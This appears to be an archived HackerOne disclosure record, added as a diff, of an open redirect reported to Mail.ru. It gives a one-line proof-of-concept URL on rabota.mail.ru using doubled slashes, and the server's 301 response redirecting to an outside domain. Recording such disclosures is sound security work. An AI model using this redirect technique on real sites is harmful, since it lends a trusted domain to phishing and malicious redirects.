@@ -1,0 +1,24 @@
+ReportLink:https://hackerone.com/reports/87804
+WeaknessName:Open Redirect
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:03.10.2016 11:57:09
+
+Summary:
+
+PoC:
+`http://rabota.mail.ru//blackfan.ru//`
+
+HTTP Response:
+```
+HTTP/1.1 301 Moved Permanently
+Server: nginx/1.7.10
+Date: Mon, 07 Sep 2015 07:24:30 GMT
+Content-Length: 0
+Connection: keep-alive
+Keep-Alive: timeout=60
+Location: //blackfan.ru
+```
